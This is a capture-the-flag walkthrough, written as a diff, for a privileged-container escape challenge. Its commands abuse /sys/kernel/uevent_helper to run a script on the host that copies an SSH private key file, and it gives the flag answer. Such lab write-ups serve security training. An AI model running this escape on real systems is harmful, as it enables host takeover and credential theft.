@@ -1,0 +1,26 @@
+Prison Escape (Elfen Ring 2)
+Objective: Escape from container and get hex string in host file: /home/jailer/.ssh/jail.key.priv
+Hint: "mount" up to expose users in /home/ dir (not actually used)
+Reference: learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/
+
+1) Gets overlay filesystem path aka path appearing to host to / within container. Echo it to use for step 2.
+  ~$ sudo su root
+  ~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+  ~# echo $host_path
+
+2) Two line script: first to trigger shell and second to cat out the target file on the host into output.txt in / within the container. The path may different from people to people.
+  ~# nano /trigger.sh
+  > #!/bin/sh
+  > cat /home/jailer/.ssh/jail.key.priv > (value in $host_path)/output.txt
+
+3) Make the script executable.
+  ~# chmod +x /trigger.sh
+
+4) Point to the script and then trigger the script and Notification on release.
+  ~# echo "$host_path/trigger.sh" > /sys/kernel/uevent_helper
+  ~# echo change > /sys/class/mem/null/uevent
+
+5) Cat out the output file to get the flag.
+  ~# cat output.txt
+
+Answer: 082bb339ec19de4935867
